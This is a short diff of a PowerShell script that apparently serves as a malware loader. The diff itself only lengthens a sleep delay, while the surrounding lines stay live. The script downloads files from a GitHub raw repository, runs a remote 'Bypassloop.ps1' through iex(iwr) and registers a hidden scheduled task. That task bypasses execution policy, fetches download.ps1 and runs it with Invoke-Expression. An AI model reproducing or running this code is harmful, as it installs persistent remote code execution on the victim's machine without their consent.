@@ -6,7 +6,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"
 
     iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Bypassloop.ps1" -useb)
-    Start-Sleep -Seconds 8
+    Start-Sleep -Seconds 10
 }
 
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& { $ProgressPreference = 'SilentlyContinue'; $t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t.Content -replace 'dropfileurl', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | Invoke-Expression }`""
